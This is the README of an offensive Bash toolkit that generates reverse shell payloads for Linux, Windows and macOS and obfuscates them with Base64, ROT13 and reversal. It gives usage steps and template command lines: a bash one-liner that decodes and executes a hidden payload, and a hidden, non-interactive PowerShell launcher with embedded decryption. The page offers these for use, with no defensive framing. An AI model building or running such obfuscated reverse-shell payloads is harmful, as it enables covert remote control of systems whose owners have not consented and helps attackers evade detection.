# üêö BlackBoxPayloads

**BlackBoxPayloads** is a pure Bash toolkit that provides a full system for generating and encrypting reverse shell payloads ‚Äî with zero external dependencies. It supports Linux, Windows, and macOS, and works with many common payload formats.

## ‚öôÔ∏è Features

- ‚úÖ Written entirely in Bash ‚Äì no external tools required  
- ‚úÖ Generate reverse shell payloads for Linux, Windows, macOS  
- ‚úÖ Advanced encryption: Base64 ‚Üí ROT13 ‚Üí Reverse  
- ‚úÖ Support for all major payload types (bash, powershell, vbs, js, php, python...)  
- ‚úÖ Fully interactive and easy to use  
- ‚úÖ 100% compatible with `nc` (netcat)

## üìÅ Project Structure

| File                   | Description |
|------------------------|-------------|
| `silentShell.sh`       | Interactive reverse shell payload generator |
| `encryptor_linux.sh`   | Encrypts Linux payloads using Base64 + ROT13 + Reverse |
| `encryptor_windows.sh` | Encrypts Windows payloads (.ps1, .bat, .vbs, .js, .hta) with proper wrapper logic |

---

## üöÄ Usage

### 1. Generate Reverse Shell Payload

```bash
chmod +x silentShell.sh
./silentShell.sh

Select target OS (Linux / Windows / macOS)

Select payload type (bash, powershell, python, etc.)

Enter LHOST and LPORT

Payload will be saved as: payload_<type>.<ext>



---

2. Encrypt Payload (Linux)

chmod +x encryptor_linux.sh
./encryptor_linux.sh

Options:

[1] Encrypt a custom command (multi-line supported)

[2] Encrypt from an existing payload file


Resulting output is a safe, executable bash command like:

bash -c "$(echo '<payload>' | rev | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 -d)"


---

3. Encrypt Payload (Windows)

chmod +x encryptor_windows.sh
./encryptor_windows.sh

Options:

[1] Encrypt a Windows payload (PowerShell, BAT, etc.)

[2] Encrypt from a payload file


Produces fully working Windows payloads with embedded decryption logic.

Example:

powershell -NoP -NonI -W Hidden -Command "$e='<payload>'; <decryption_logic>"
